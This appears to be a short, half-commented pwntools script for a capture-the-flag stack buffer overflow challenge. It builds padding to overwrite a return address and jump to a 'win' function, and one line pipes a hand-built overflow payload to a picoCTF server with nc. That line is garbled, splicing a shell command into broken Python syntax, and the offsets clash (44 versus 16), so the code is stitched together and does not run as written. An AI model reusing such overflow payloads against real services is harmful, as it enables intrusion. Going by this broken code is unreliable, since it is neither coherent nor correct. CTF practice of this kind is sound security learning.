from pwn import *

#port = 31680
#debug = 1

#if not debug:
#        p = remote('tjc.tf', port)
#else:
#        p = process('./chall')
#
#print(p.recvline())

with f aspython3 -c "import sys; sys.stdout.buffer.write(b'\x41'*44+b'\xf6\x91\x04\x08'+b'\x0a')" > input.txt ; nc saturn.picoctf.net 57610 < input.txt

#offset = 0xffffd0bc - 0xffffd090        # start of return address - start of buffer
offset = 16
payload = b'A' * offset                 # padding
#payload += p32(0x401196)		# win

#p.sendline(payload)

#print(p.recvline())
#print(p.recv())
